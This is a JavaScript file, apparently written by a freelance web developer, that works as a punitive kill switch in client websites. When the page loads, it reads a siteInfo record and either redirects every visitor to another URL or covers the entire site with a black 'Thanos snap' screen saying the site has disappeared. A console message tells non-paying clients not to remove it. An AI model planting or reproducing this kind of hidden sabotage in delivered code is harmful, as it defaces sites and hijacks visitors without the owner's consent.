/*!
 * Blocker.js
 * Made to protect against scammers
 * by Deus Notam
 * Telegram → https://t.me/d3usn0tam
 * Данный скрипт отвечает за наказание.
 */

// Массив с эффектами
const effects = {
  //redirect - редирект на redirecturl
  redirect: (redirectUrl) => {
    console.log(`Применяется эффект redirect на ${redirectUrl}`);
    window.location.replace(redirectUrl);
  },
  //thanos - поверх сайта чёрный экран с gif щелком таноса
  thanos: (startDate) => {
    console.log("Применяется эффект Thanos");
    const blackScreen = document.createElement("div");
  blackScreen.style.position = "fixed";
  blackScreen.style.top = "0";
  blackScreen.style.left = "0";
  blackScreen.style.width = "100%";
  blackScreen.style.height = "100%";
  blackScreen.style.background = "black";
  blackScreen.style.zIndex = "999999999";
  blackScreen.style.display = "flex";
  blackScreen.style.flexDirection = "column";
  blackScreen.style.alignItems = "center";
  blackScreen.style.justifyContent = "center";

  const gifImage = document.createElement("img");
  gifImage.src = "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZWZ0bWRoajlyem1lbHViczd0MzU4YnlneHQ4cGRwMmhweTFsdzZjYSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LOoaJ2lbqmduxOaZpS/giphy.gif";
  gifImage.alt = "Tanos Snap";
  gifImage.style.marginBottom = "20px";

  const caption = document.createElement("p");
  caption.style.color = "white";
  caption.innerText = "Упс... Произошёл щелчок Таноса - сайт исчез...";

  blackScreen.appendChild(gifImage);
  blackScreen.appendChild(caption);

  document.body.appendChild(blackScreen);
  }
};
    
  // Функция для проверки домена
  function checkDomain() {

    console.log("Site Info:", siteInfo);

    // Применение эффекта, если домен найден в списке
    const effectFunction = effects[siteInfo.blocker_effect];
    if (effectFunction) {
        effectFunction(siteInfo.blocker_redirecturl || siteInfo.blocker_date);
    }
        
    // Проверка, если case у домена равен "didnt pay"
    if (siteInfo && siteInfo.blocker_cause === "didnt pay") {
        console.log(`Этот заказчик ${siteInfo.blocker_date} не оплатил заказанную работу, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nTelegram Group → https://t.me/d3usn0tam`);
      }
  }

// Вызов функции для проверки домена
checkDomain();
